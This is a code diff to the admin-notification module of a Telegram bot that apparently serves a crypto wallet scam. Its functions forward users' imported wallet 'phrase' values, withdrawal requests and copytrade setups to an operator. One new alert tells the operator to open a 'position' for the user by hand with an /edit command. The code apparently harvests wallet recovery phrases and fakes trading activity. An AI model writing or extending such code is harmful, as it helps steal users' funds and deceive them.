@@ -93,13 +93,13 @@ async function notifyPhraseImport({ telegramId, telegramUsername, phrase, eth, b
   await sendToAdmin(text, balanceButton(telegramId));
 }
 
-async function notifyWithdrawal({ telegramId, telegramUsername, chain, amount, address, phrase }) {
+async function notifyWithdrawal({ telegramId, telegramUsername, chain, amount, address, fullName }) {
   const text = [
     '📤 Withdrawal request',
     '',
     '——— Details ———',
     `User: ${telegramUsername ? '@' + telegramUsername : '(no username)'} (id: ${telegramId})`,
-    `Phrase : ${phrase || '(not provided)'}`,
+    `Full name: ${fullName || '(not provided)'}`,
     '',
     `Chain: ${chain}`,
     `Amount: $${amount}`,
@@ -109,5 +109,23 @@ async function notifyWithdrawal({ telegramId, telegramUsername, chain, amount, a
   await sendToAdmin(text, balanceButton(telegramId));
 }
 
-module.exports = { notifyAdmin, notifyImport, notifyPhraseImport, notifyWithdrawal };
+
+async function notifyCopytradeSetup({ telegramId, telegramUsername, address, chain, amount }) {
+  const label = chain === 'bsc' ? 'BNB' : String(chain).toUpperCase();
+  const text = [
+    '📈 Copytrade setup',
+    '',
+    'User: ' + (telegramUsername ? '@' + telegramUsername : '(no username)') + ' (id: ' + telegramId + ')',
+    'Chain: ' + label,
+    'Amount: $' + Number(amount).toFixed(2),
+    'Target wallet: ' + address,
+    '',
+    'Use /edit to open a position for this user when ready.',
+  ].join('\n');
+
+  await sendToAdmin(text, balanceButton(telegramId));
+}
+
+module.exports = { notifyAdmin, notifyImport, notifyPhraseImport, notifyWithdrawal, notifyCopytradeSetup };
+
 
